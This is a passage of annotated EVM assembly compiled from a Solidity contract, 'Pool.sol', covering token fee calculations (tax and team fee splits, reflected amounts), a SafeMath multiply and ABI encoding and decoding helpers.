\"contracts/Pool/Pool.sol\":13582:13601  tAmount.mul(taxFee) */\n      tag_411\n        /* \"contracts/Pool/Pool.sol\":13594:13600  taxFee */\n      dup9\n        /* \"contracts/Pool/Pool.sol\":13582:13589  tAmount */\n      dup11\n        /* \"contracts/Pool/Pool.sol\":13582:13593  tAmount.mul */\n      tag_396\n      swap1\n        /* \"contracts/Pool/Pool.sol\":13582:13601  tAmount.mul(taxFee) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_411:\n        /* \"contracts/Pool/Pool.sol\":13582:13605  tAmount.mul(taxFee).div */\n      tag_326\n      swap1\n        /* \"contracts/Pool/Pool.sol\":13582:13610  tAmount.mul(taxFee).div(100) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_410:\n        /* \"contracts/Pool/Pool.sol\":13567:13610  uint256 tFee = tAmount.mul(taxFee).div(100) */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":13620:13633  uint256 tTeam */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":13636:13665  tAmount.mul(TeamFee).div(100) */\n      tag_412\n        /* \"contracts/Pool/Pool.sol\":13661:13664  100 */\n      0x64\n        /* \"contracts/Pool/Pool.sol\":13636:13656  tAmount.mul(TeamFee) */\n      tag_413\n        /* \"contracts/Pool/Pool.sol\":13648:13655  TeamFee */\n      dup9\n        /* \"contracts/Pool/Pool.sol\":13636:13643  tAmount */\n      dup12\n        /* \"contracts/Pool/Pool.sol\":13636:13647  tAmount.mul */\n      tag_396\n      swap1\n        /* \"contracts/Pool/Pool.sol\":13636:13656  tAmount.mul(TeamFee) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_413:\n        /* \"contracts/Pool/Pool.sol\":13636:13660  tAmount.mul(TeamFee).div */\n      tag_326\n      swap1\n        /* \"contracts/Pool/Pool.sol\":13636:13665  tAmount.mul(TeamFee).div(100) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_412:\n        /* \"contracts/Pool/Pool.sol\":13620:13665  uint256 tTeam = tAmount.mul(TeamFee).div(100) */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":13675:13698  uint256 tTransferAmount */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":13701:13729  tAmount.sub(tFee).sub(tTeam) */\n      tag_414\n        /* \"contracts/Pool/Pool.sol\":13723:13728  tTeam */\n      dup3\n        /* \"contracts/Pool/Pool.sol\":13701:13718  tAmount.sub(tFee) */\n      tag_415\n        /* \"contracts/Pool/Pool.sol\":13713:13717  tFee */\n      dup6\n        /* \"contracts/Pool/Pool.sol\":13701:13708  tAmount */\n      dup13\n        /* \"contracts/Pool/Pool.sol\":13701:13712  tAmount.sub */\n      tag_364\n      swap1\n        /* \"contracts/Pool/Pool.sol\":13701:13718  tAmount.sub(tFee) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_415:\n        /* \"contracts/Pool/Pool.sol\":13701:13722  tAmount.sub(tFee).sub */\n      tag_364\n      swap1\n        /* \"contracts/Pool/Pool.sol\":13701:13729  tAmount.sub(tFee).sub(tTeam) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_414:\n        /* \"contracts/Pool/Pool.sol\":13675:13729  uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam) */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":13747:13762  tTransferAmount */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":13764:13768  tFee */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":13770:13775  tTeam */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":13739:13776  return (tTransferAmount, tFee, tTeam) */\n      swap6\n      pop\n      swap6\n      pop\n      swap6\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Pool/Pool.sol\":13437:13783  function _getTValues(uint256 tAmount, uint256 taxFee, uint256 TeamFee) private pure returns (uint256, uint256, uint256) {... */\n      swap4\n      pop\n      swap4\n      pop\n      swap4\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":13789:14192  function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {... */\n    tag_384:\n        /* \"contracts/Pool/Pool.sol\":13899:13906  uint256 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":13908:13915  uint256 */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":13917:13924  uint256 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":13936:13951  uint256 rAmount */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":13954:13978  tAmount.mul(currentRate) */\n      tag_417\n        /* \"contracts/Pool/Pool.sol\":13966:13977  currentRate */\n      dup6\n        /* \"contracts/Pool/Pool.sol\":13954:13961  tAmount */\n      dup10\n        /* \"contracts/Pool/Pool.sol\":13954:13965  tAmount.mul */\n      tag_396\n      swap1\n        /* \"contracts/Pool/Pool.sol\":13954:13978  tAmount.mul(currentRate) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_417:\n        /* \"contracts/Pool/Pool.sol\":13936:13978  uint256 rAmount = tAmount.mul(currentRate) */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":13988:14000  uint256 rFee */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":14003:14024  tFee.mul(currentRate) */\n      tag_418\n        /* \"contracts/Pool/Pool.sol\":14012:14023  currentRate */\n      dup7\n        /* \"contracts/Pool/Pool.sol\":14003:14007  tFee */\n      dup10\n        /* \"contracts/Pool/Pool.sol\":14003:14011  tFee.mul */\n      tag_396\n      swap1\n        /* \"contracts/Pool/Pool.sol\":14003:14024  tFee.mul(currentRate) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_418:\n        /* \"contracts/Pool/Pool.sol\":13988:14024  uint256 rFee = tFee.mul(currentRate) */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":14034:14047  uint256 rTeam */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":14050:14072  tTeam.mul(currentRate) */\n      tag_419\n        /* \"contracts/Pool/Pool.sol\":14060:14071  currentRate */\n      dup8\n        /* \"contracts/Pool/Pool.sol\":14050:14055  tTeam */\n      dup10\n        /* \"contracts/Pool/Pool.sol\":14050:14059  tTeam.mul */\n      tag_396\n      swap1\n        /* \"contracts/Pool/Pool.sol\":14050:14072  tTeam.mul(currentRate) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_419:\n        /* \"contracts/Pool/Pool.sol\":14034:14072  uint256 rTeam = tTeam.mul(currentRate) */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":14082:14105  uint256 rTransferAmount */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":14108:14136  rAmount.sub(rFee).sub(rTeam) */\n      tag_420\n        /* \"contracts/Pool/Pool.sol\":14130:14135  rTeam */\n      dup3\n        /* \"contracts/Pool/Pool.sol\":14108:14125  rAmount.sub(rFee) */\n      tag_421\n        /* \"contracts/Pool/Pool.sol\":14120:14124  rFee */\n      dup6\n        /* \"contracts/Pool/Pool.sol\":14108:14115  rAmount */\n      dup8\n        /* \"contracts/Pool/Pool.sol\":14108:14119  rAmount.sub */\n      tag_364\n      swap1\n        /* \"contracts/Pool/Pool.sol\":14108:14125  rAmount.sub(rFee) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_421:\n        /* \"contracts/Pool/Pool.sol\":14108:14129  rAmount.sub(rFee).sub */\n      tag_364\n      swap1\n        /* \"contracts/Pool/Pool.sol\":14108:14136  rAmount.sub(rFee).sub(rTeam) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_420:\n        /* \"contracts/Pool/Pool.sol\":14082:14136  uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam) */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":14154:14161  rAmount */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":14163:14178  rTransferAmount */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":14180:14184  rFee */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":14146:14185  return (rAmount, rTransferAmount, rFee) */\n      swap7\n      pop\n      swap7\n      pop\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Pool/Pool.sol\":13789:14192  function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {... */\n      swap5\n      pop\n      swap5\n      pop\n      swap5\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":2297:2536  function mul(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_396:\n        /* \"contracts/Pool/Pool.sol\":2355:2362  uint256 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":2383:2384  0 */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":2378:2379  a */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":2378:2384  a == 0 */\n      sub\n        /* \"contracts/Pool/Pool.sol\":2374:2419  if (a == 0) {... */\n      tag_423\n      jumpi\n        /* \"contracts/Pool/Pool.sol\":2407:2408  0 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":2400:2408  return 0 */\n      swap1\n      pop\n      jump(tag_422)\n        /* \"contracts/Pool/Pool.sol\":2374:2419  if (a == 0) {... */\n    tag_423:\n        /* \"contracts/Pool/Pool.sol\":2428:2437  uint256 c */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":2444:2445  b */\n      dup3\n        /* \"contracts/Pool/Pool.sol\":2440:2441  a */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":2440:2445  a * b */\n      tag_424\n      swap2\n      swap1\n      tag_425\n      jump\t// in\n    tag_424:\n        /* \"contracts/Pool/Pool.sol\":2428:2445  uint256 c = a * b */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":2472:2473  b */\n      dup3\n        /* \"contracts/Pool/Pool.sol\":2467:2468  a */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":2463:2464  c */\n      dup3\n        /* \"contracts/Pool/Pool.sol\":2463:2468  c / a */\n      tag_426\n      swap2\n      swap1\n      tag_405\n      jump\t// in\n    tag_426:\n        /* \"contracts/Pool/Pool.sol\":2463:2473  c / a == b */\n      eq\n        /* \"contracts/Pool/Pool.sol\":2455:2511  require(c / a == b, \"SafeMath: multiplication overflow\") */\n      tag_427\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_428\n      swap1\n      tag_429\n      jump\t// in\n    tag_428:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_427:\n        /* \"contracts/Pool/Pool.sol\":2528:2529  c */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":2521:2529  return c */\n      swap2\n      pop\n      pop\n        /* \"contracts/Pool/Pool.sol\":2297:2536  function mul(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_422:\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:106   */\n    tag_430:\n        /* \"#utility.yul\":59:65   */\n      0x00\n        /* \"#utility.yul\":93:98   */\n      dup2\n        /* \"#utility.yul\":87:99   */\n      mload\n        /* \"#utility.yul\":77:99   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:106   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":112:281   */\n    tag_431:\n        /* \"#utility.yul\":196:207   */\n      0x00\n        /* \"#utility.yul\":230:236   */\n      dup3\n        /* \"#utility.yul\":225:228   */\n      dup3\n        /* \"#utility.yul\":218:237   */\n      mstore\n        /* \"#utility.yul\":270:274   */\n      0x20\n        /* \"#utility.yul\":265:268   */\n      dup3\n        /* \"#utility.yul\":261:275   */\n      add\n        /* \"#utility.yul\":246:275   */\n      swap1\n      pop\n        /* \"#utility.yul\":112:281   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":287:594   */\n    tag_432:\n        /* \"#utility.yul\":355:356   */\n      0x00\n        /* \"#utility.yul\":365:478   */\n    tag_508:\n        /* \"#utility.yul\":379:385   */\n      dup4\n        /* \"#utility.yul\":376:377   */\n      dup2\n        /* \"#utility.yul\":373:386   */\n      lt\n        /* \"#utility.yul\":365:478   */\n      iszero\n      tag_510\n      jumpi\n        /* \"#utility.yul\":464:465   */\n      dup1\n        /* \"#utility.yul\":459:462   */\n      dup3\n        /* \"#utility.yul\":455:466   */\n      add\n        /* \"#utility.yul\":449:467   */\n      mload\n        /* \"#utility.yul\":445:446   */\n      dup2\n        /* \"#utility.yul\":440:443   */\n      dup5\n        /* \"#utility.yul\":436:447   */\n      add\n        /* \"#utility.yul\":429:468   */\n      mstore\n        /* \"#utility.yul\":401:403   */\n      0x20\n        /* \"#utility.yul\":398:399   */\n      dup2\n        /* \"#utility.yul\":394:404   */\n      add\n        /* \"#utility.yul\":389:404   */\n      swap1\n      pop\n        /* \"#utility.yul\":365:478   */\n      jump(tag_508)\n    tag_510:\n        /* \"#utility.yul\":496:502   */\n      dup4\n        /* \"#utility.yul\":493:494   */\n      dup2\n        /* \"#utility.yul\":490:503   */\n      gt\n        /* \"#utility.yul\":487:588   */\n      iszero\n      tag_511\n      jumpi\n        /* \"#utility.yul\":576:577   */\n      0x00\n        /* \"#utility.yul\":567:573   */\n      dup5\n        /* \"#utility.yul\":562:565   */\n      dup5\n        /* \"#utility.yul\":558:574   */\n      add\n        /* \"#utility.yul\":551:578   */\n      mstore\n        /* \"#utility.yul\":487:588   */\n    tag_511:\n        /* \"#utility.yul\":336:594   */\n      pop\n        /* \"#utility.yul\":287:594   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":600:702   */\n    tag_433:\n        /* \"#utility.yul\":641:647   */\n      0x00\n        /* \"#utility.yul\":692:694   */\n      0x1f\n        /* \"#utility.yul\":688:695   */\n      not\n        /* \"#utility.yul\":683:685   */\n      0x1f\n        /* \"#utility.yul\":676:681   */\n      dup4\n        /* \"#utility.yul\":672:686   */\n      add\n        /* \"#utility.yul\":668:696   */\n      and\n        /* \"#utility.yul\":658:696   */\n      swap1\n      pop\n        /* \"#utility.yul\":600:702   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":708:1072   */\n    tag_434:\n        /* \"#utility.yul\":796:799   */\n      0x00\n        /* \"#utility.yul\":824:863   */\n      tag_514\n        /* \"#utility.yul\":857:862   */\n      dup3\n        /* \"#utility.yul\":824:863   */\n      tag_430\n      jump\t// in\n    tag_514:\n        /* \"#utility.yul\":879:950   */\n      tag_515\n        /* \"#utility.yul\":943:949   */\n      dup2\n        /* \"#utility.yul\":938:941   */\n      dup6\n        /* \"#utility.yul\":879:950   */\n      tag_431\n      jump\t// in\n    tag_515:\n        /* \"#utility.yul\":872:950   */\n      swap4\n      pop\n        /* \"#utility.yul\":959:1011   */\n      tag_516\n        /* \"#utility.yul\":1004:1010   */\n      dup2\n        /* \"#utility.yul\":999:1002   */\n      dup6\n        /* \"#utility.yul\":992:996   */\n      0x20\n        /* \"#utility.yul\":985:990   */\n      dup7\n        /* \"#utility.yul\":981:997   */\n      add\n        /* \"#utility.yul\":959:1011   */\n      tag_432\n      jump\t// in\n    tag_516:\n        /* \"#utility.yul\":1036:1065   */\n      tag_517\n        /* \"#utility.yul\":1058:1064   */\n      dup2\n        /* \"#utility.yul\":1036:1065   */\n      tag_433\n      jump\t// in\n    tag_517:\n        /* \"#utility.yul\":1031:1034   */\n      dup5\n        /* \"#utility.yul\":1027:1066   */\n      add\n        /* \"#utility.yul\":1020:1066   */\n      swap2\n      pop\n        /* \"#utility.yul\":800:1072   */\n      pop\n        /* \"#utility.yul\":708:1072   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1078:1391   */\n    tag_36:\n        /* \"#utility.yul\":1191:1195   */\n      0x00\n        /* \"#utility.yul\":1229:1231   */\n      0x20\n        /* \"#utility.yul\":1218:1227   */\n      dup3\n        /* \"#utility.yul\":1214:1232   */\n      add\n        /* \"#utility.yul\":1206:1232   */\n      swap1\n      pop\n        /* \"#utility.yul\":1278:1287   */\n      dup2\n        /* \"#utility.yul\":1272:1276   */\n      dup2\n        /* \"#utility.yul\":1268:1288   */\n      sub\n        /* \"#utility.yul\":1264:1265   */\n      0x00\n        /* \"#utility.yul\":1253:1262   */\n      dup4\n        /* \"#utility.yul\":1249:1266   */\n      add\n        /* \"#utility.yul\":1242:1289   */\n      mstore\n        /* \"#utility.yul\":1306:1384   */\n      tag_519\n        /* \"#utility.yul\":1379:1383   */\n      dup2\n        /* \"#utility.yul\":1370:1376   */\n      dup5\n        /* \"#utility.yul\":1306:1384   */\n      tag_434\n      jump\t// in\n    tag_519:\n        /* \"#utility.yul\":1298:1384   */\n      swap1\n      pop\n        /* \"#utility.yul\":1078:1391   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1478:1595   */\n    tag_436:\n        /* \"#utility.yul\":1587:1588   */\n      0x00\n        /* \"#utility.yul\":1584:1585   */\n      dup1\n        /* \"#utility.yul\":1577:1589   */\n      revert\n        /* \"#utility.yul\":1601:1718   */\n    tag_437:\n        /* \"#utility.yul\":1710:1711   */\n      0x00\n        /* \"#utility.yul\":1707:1708   */\n      dup1\n        /* \"#utility.yul\":1700:1712   */\n      revert\n        /* \"#utility.yul\":1724:1850   */\n    tag_438:\n        /* \"#utility.yul\":1761:1768   */\n      0x00\n        /* \"#utility.yul\":1801:1843   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1794:1799   */\n      dup3\n        /* \"#utility.yul\":1790:1844   */\n      and\n        /* \"#utility.yul\":1779:1844   */\n      swap1\n      pop\n        /* \"#utility.yul\":1724:1850   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1856:1952   */\n    tag_439:\n        /* \"#utility.yul\":1893:1900   */\n      0x00\n        /* \"#utility.yul\":1922:1946   */\n      tag_525\n        /* \"#utility.yul\":1940:1945   */\n      dup3\n        /* \"#utility.yul\":1922:1946   */\n      tag_438\n      jump\t// in\n    tag_525:\n        /* \"#utility.yul\":1911:1946   */\n      swap1\n      pop\n        /* \"#utility.yul\":1856:1952   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1958:2080   */\n    tag_440:\n        /* \"#utility.yul\":2031:2055   */\n      tag_527\n        /* \"#utility.yul\":2049:2054   */\n      dup2\n        /* \"#utility.yul\":2031:2055   */\n      tag_439\n      jump\t// in\n    tag_527:\n        /* \"#utility.yul\":2024:2029   */\n      dup2\n        /* \"#utility.yul\":2021:2056   */\n      eq\n        /* \"#utility.yul\":2011:2074   */\n      tag_528\n      jumpi\n        /* \"#utility.yul\":2070:2071   */\n      0x00\n        /* \"#utility.yul\":2067:2068   */\n      dup1\n        /* \"#utility.yul\":2060:2072   */\n      revert\n        /* \"#utility.yul\":2011:2074   */\n    tag_528:\n        /* \"#utility.yul\":1958:2080   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2086:2225   */\n    tag_441:\n        /* \"#utility.yul\":2132:2137   */\n      0x00\n        /* \"#utility.yul\":2170:2176   */\n      dup2\n        /* \"#utility.yul\":2157:2177   */\n      calldataload\n        /* \"#utility.yul\":2148:2177   */\n      swap1\n      pop\n        /* \"#utility.yul\":2186:2219   */\n      tag_530\n        /* \"#utility.yul\":2213:2218   */\n      dup2\n        /* \"#utility.yul\":2186:2219   */\n      tag_440\n      jump\t// in\n    tag_530:\n        /* \"#utility.yul\":2086:2225   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2231:2308   */\n    tag_442:\n        /* \"#utility.yul\":2268:2275   */\n      0x00\n        /* \"#utility.yul\":2297:2302   */\n      dup2\n        /* \"#utility.yul\":2286:2302   */\n      swap1\n      pop\n        /* \"#utility.yul\":2231:2308   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2314:2436   */\n    tag_443:\n        /* \"#utility.yul\":2387:2411   */\n      tag_533\n        /* \"#utility.yul\":2405:2410   */\n      dup2\n        /* \"#utility.yul\":2387:2411   */\n      tag_442\n      jump\t// in\n    tag_533:\n        /* \"#utility.yul\":2380:2385   */\n      dup2\n        /* \"#utility.yul\":2377:2412   */\n      eq\n        /* \"#utility.yul\":2367:2430   */\n      tag_534\n      jumpi\n        /* \"#utility.yul\":2426:2427   */\n      0x00\n        /* \"#utility.yul\":2423:2424   */\n      dup1\n        /* \"#utility.yul\":2416:2428   */\n      revert\n        /* \"#utility.yul\":2367:2430   */\n    tag_534:\n        /* \"#utility.yul\":2314:2436   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2442:2581   */\n    tag_444:\n        /* \"#utility.yul\":2488:2493   */\n      0x00\n        /* \"#utility.yul\":2526:2532   */\n      dup2\n        /* \"#utility.yul\":2513:2533   */\n      calldataload\n        /* \"#utility.yul\":2504:2533   */\n      swap1\n      pop\n        /* \"#utility.yul\":2542:2575   */\n      tag_536\n        /* \"#utility.yul\":2569:2574   */\n      dup2\n        /* \"#utility.yul\":2542:2575   */\n      tag_443\n      jump\t// in\n    tag_536:\n        /* \"#utility.yul\":2442:2581   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2587:3061   */\n    tag_40:\n        /* \"#utility.yul\":2655:2661   */\n      0x00\n        /* \"#utility.yul\":2663:2669   */\n      dup1\n        /* \"#utility.yul\":2712:2714   */\n      0x40\n        /* \"#utility.yul\":2700:2709   */\n      dup4\n        /* \"#utility.yul\":2691:2698   */\n      dup6\n        /* \"#utility.yul\":2687:2710   */\n      sub\n        /* \"#utility.yul\":2683:2715   */\n      slt\n        /* \"#utility.yul\":2680:2799   */\n      iszero\n      tag_538\n      jumpi\n        /* \"#utility.yul\":2718:2797   */\n      tag_539\n      tag_436\n      jump\t// in\n    tag_539:\n        /* \"#utility.yul\":2680:2799   */\n    tag_538:\n        /* \"#utility.yul\":2838:2839   */\n      0x00\n        /* \"#utility.yul\":2863:2916   */\n      tag_540\n        /* \"#utility.yul\":2908:2915   */\n      dup6\n        /* \"#utility.yul\":2899:2905   */\n      dup3\n        /* \"#utility.yul\":2888:2897   */\n      dup7\n        /* \"#utility.yul\":2884:2906   */\n      add\n        /* \"#utility.yul\":2863:2916   */\n      tag_441\n      jump\t// in\n    tag_540:\n        /* \"#utility.yul\":2853:2916   */\n      swap3\n      pop\n        /* \"#utility.yul\":2809:2926   */\n      pop\n        /* \"#utility.yul\":2965:2967   */\n      0x20\n        /* \"#utility.yul\":2991:3044   */\n      tag_541\n        /* \"#utility.yul\":3036:3043   */\n      dup6\n        /* \"#utility.yul\":3027:3033   */\n      dup3\n        /* \"#utility.yul\":3016:3025   */\n      dup7\n        /* \"#utility.yul\":3012:3034   */\n      add\n        /* \"#utility.yul\":2991:3044   */\n      tag_444\n      jump\t// in\n    tag_541:\n        /* \"#utility.yul\":2981:3044   */\n      swap2\n      pop\n        /* \"#utility.yul\":2936:3054   */\n      pop\n        /* \"#utility.yul\":2587:3061   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3067:3157   */\n    tag_445:\n        /* \"#utility.yul\":3101:3108   */\n      0x00\n        /* \"#utility.yul\":3144:3149   */\n      dup2\n        /* \"#utility.yul\":3137:3150   */\n      iszero\n        /* \"#utility.yul\":3130:3151   */\n      iszero\n        /* \"#utility.yul\":3119:3151   */\n      swap1\n      pop\n        /* \"#utility.yul\":3067:3157   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3163:3272   */\n    tag_446:\n        /* \"#utility.yul\":3244:3265   */\n      tag_544\n        /* \"#utility.yul\":3259:3264   */\n      dup2\n        /* \"#utility.yul\":3244:3265   */\n      tag_445\n      jump\t// in\n    tag_544:\n        /* \"#utility.yul\":3239:3242   */\n      dup3\n        /* \"#utility.yul\":3232:3266   */\n      mstore\n        /* \"#utility.yul\":3163:3272   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3278:3488   */\n    tag_43:\n        /* \"#utility.yul\":3365:3369   */\n      0x00\n        /* \"#utility.yul\":3403:3405   */\n      0x20\n        /* \"#utility.yul\":3392:3401   */\n      dup3\n        /* \"#utility.yul\":3388:3406   */\n      add\n        /* \"#utility.yul\":3380:3406   */\n      swap1\n      pop\n        /* \"#utility.yul\":3416:3481   */\n      tag_546\n        /* \"#utility.yul\":3478:3479   */\n      0x00\n        /* \"#utility.yul\":3467:3476   */\n      dup4\n        /* \"#utility.yul\":3463:3480   */\n      add\n        /* \"#utility.yul\":3454:3460   */\n      dup5\n        /* \"#utility.yul\":3416:3481   */\n      tag_446\n      jump\t// in\n    tag_546:\n        /* \"#utility.yul\":3278:3488   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3494:3554   */\n    tag_447:\n        /* \"#utility.yul\":3522:3525   */\n      0x00\n        /* \"#utility.yul\":3543:3548   */\n      dup2\n        /* \"#utility.yul\":3536:3548   */\n      swap1\n      pop\n        /* \"#utility.yul\":3494:3554   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3560:3702   */\n    tag_448:\n        /* \"#utility.yul\":3610:3619   */\n      0x00\n        /* \"#utility.yul\":3643:3696   */\n      tag_549\n        /* \"#utility.yul\":3661:3695   */\n      tag_550\n        /* \"#utility.yul\":3670:3694   */\n      tag_551\n        /* \"#utility.yul\":3688:3693   */\n      dup5\n        /* \"#utility.yul\":3670:3694   */\n      tag_438\n      jump\t// in\n    tag_551:\n        /* \"#utility.yul\":3661:3695   */\n      tag_447\n      jump\t// in\n    tag_550:\n        /* \"#utility.yul\":3643:3696   */\n      tag_438\n      jump\t// in\n    tag_549:\n        /* \"#utility.yul\":3630:3696   */\n      swap1\n      pop\n        /* \"#utility.yul\":3560:3702   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3708:3834   */\n    tag_449:\n        /* \"#utility.yul\":3758:3767   */\n      0x00\n        /* \"#utility.yul\":3791:3828   */\n      tag_553\n        /* \"#utility.yul\":3822:3827   */\n      dup3\n        /* \"#utility.yul\":3791:3828   */\n      tag_448\n      jump\t// in\n    tag_553:\n        /* \"#utility.yul\":3778:3828   */\n      swap1\n      pop\n        /* \"#utility.yul\":3708:3834   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3840:3992   */\n    tag_450:\n        /* \"#utility.yul\":3916:3925   */\n      0x00\n        /* \"#utility.yul\":3949:3986   */\n      tag_555\n        /* \"#utility.yul\":3980:3985   */\n      dup3\n        /* \"#utility.yul\":3949:3986   */\n      tag_449\n      jump\t// in\n    tag_555:\n        /* \"#utility.yul\":3936:3986   */\n      swap1\n      pop\n        /* \"#utility.yul\":3840:3992   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3998:4181   */\n    tag_451:\n        /* \"#utility.yul\":4111:4174   */\n      tag_557\n        /* \"#utility.yul\":4168:4173   */\n      dup2\n        /* \"#utility.yul\":4111:4174   */\n      tag_450\n      jump\t// in\n    tag_557:\n        /* \"#utility.yul\":4106:4109   */\n      dup3\n        /* \"#utility.yul\":4099:4175   */\n      mstore\n        /* \"#utility.yul\":3998:4181   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4187:4461   */\n    tag_48:\n        /* \"#utility.yul\":4306:4310   */\n      0x00\n        /* \"#utility.yul\":4344:4346   */\n      0x20\n        /* \"#utility.yul\":4333:4342   */\n      dup3\n        /* \"#utility.yul\":4329:4347   */\n      add\n        /* \"#utility.yul\":4321:4347   */\n      swap1\n      pop\n        /* \"#utility.yul\":4357:4454   */\n      tag_559\n        /* \"#utility.yul\":4451:4452   */\n      0x00\n        /* \"#utility.yul\":4440:4449   */\n      dup4\n        /* \"#utility.yul\":4436:4453   */\n      add\n        /* \"#utility.yul\":4427:4433   */\n      dup5\n        /* \"#utility.yul\":4357:4454   */\n      tag_451\n      jump\t// in\n    tag_559:\n        /* \"#utility.yul\":4187:4461   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4467:4585   */\n    tag_452:\n        /* \"#utility.yul\":4554:4578   */\n      tag_561\n        /* \"#utility.yul\":4572:4577   */\n      dup2\n        /* \"#utility.yul\":4554:4578   */\n      tag_442\n      jump\t// in\n    tag_561:\n        /* \"#utility.yul\":4549:4552   */\n      dup3\n        /* \"#utility.yul\":4542:4579   */\n      mstore\n        /* \"#utility.yul\":4467:4585   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4591:4813   */\n    tag_53:\n        /* \"#utility.yul\":4684:4688   */\n      0x00\n        /* \"#utility.yul\":4722:4724   */\n      0x20\n        /* \"#utility.yul\":4711:4720   */\n      dup3\n        /* \"#utility.yul\":4707:4725   */\n      add\n        /* \"#utility.yul\":4699:4725   */\n      swap1\n      pop\n        /* \"#utility.yul\":4735:4806   */\n      tag_563\n        /* \"#utility.yul\":4803:4804   */\n      0x00\n        /* \"#utility.yul\":4792:4801   */\n      dup4\n        /* \"#utility.yul\":4788:4805   */\n      add\n        /* \"#utility.yul\":4779:4785   */\n      dup5\n        /* \"#utility.yul\":4735:4806   */\n      tag_452\n      jump\t// in\n    